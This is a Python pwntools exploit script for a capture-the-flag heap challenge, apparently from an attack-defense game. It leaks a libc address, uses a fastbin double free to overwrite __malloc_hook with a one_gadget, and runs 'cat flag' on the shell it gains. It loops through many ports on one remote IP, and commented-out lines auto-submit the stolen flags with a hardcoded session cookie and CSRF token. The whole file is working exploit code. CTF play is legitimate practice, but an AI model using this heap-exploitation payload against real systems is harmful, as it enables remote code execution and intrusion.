import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
import requests
cookies = {
    'session': '052acba7-b39f-4384-ae40-1c1078def7bb',
}

headers = {
    'Connection': 'keep-alive',
    'Accept': 'application/json',
    'CSRF-Token': 'b592779067f128f34ddc5ea5819dfc7c094bc4c64460248c19e344cf8bb45849',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://39.100.119.37:8001',
    'Referer': 'http://39.100.119.',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6',
}
def submit_flag(id,flag):
    

    data = '{"challenge_id":'+str(id)+',"submission":"'+flag+'"}'
    print(data)

    response = requests.post('http://39.100.119.37:8001/api/v1/challenges/attempt', headers=headers, cookies=cookies, data=data, verify=False)
    print(response.text)
binary='pwn'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
ssss=0
pdbg.context.log_level='debug'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			#io=pdbg.run("debug")
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			if ssss==24:
				ssss=0
			port=50280+ssss*100
			while port==51380 :
				port+=100
				ssss+=1
			io=remote('39.100.119.37',port)
			ssss+=1
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('Your Choice>> ','1')
			io.sendlineafter('index>> ',str(a))
			io.sendlineafter('size>> ',str(b))
			io.sendafter('name>> ',c)

		def delete(a):
			io.sendlineafter('Your Choice>> ','2')
			io.sendlineafter('index>> ',str(a))

		def edit(a,c):
			io.sendlineafter('Your Choice>> ','3')
			io.sendlineafter('index>> ',str(a))
			io.sendafter('name>> ',c)

		def show(a):
			io.sendlineafter('Your Choice>> ','5')
			io.sendlineafter('index>> ',str(a))


		io.recvuntil('name:\n')
		io.sendline('1')
		io.recvuntil('Darkness is coming\n')
		io.sendline('3')
		add(0,0xf0,'aaa')
		add(1,0x68,'aaa')
		delete(0)
		show(0)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		delete(1)
		edit(1,p64(libc.sym['__malloc_hook']-0x23))
		add(2,0x68,'aaa')
		add(3,0x68,'\x00'*0x13+p64(libc_base+one_gadgaet[2]))
		delete(2)
		delete(2)
		io.recv()		
		sleep(0.5)
		io.sendline('cat flag')
		# sleep(1)
		# flag1=io.recv()
		# aaa='flag{'
		# if aaa in flag1 :
		# 	print flag1
		# 	submit_flag(5,flag1)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		# io.interactive()
		# io.close()

	except Exception as e:
		io.close()
		continue
	# else:
	# 	continue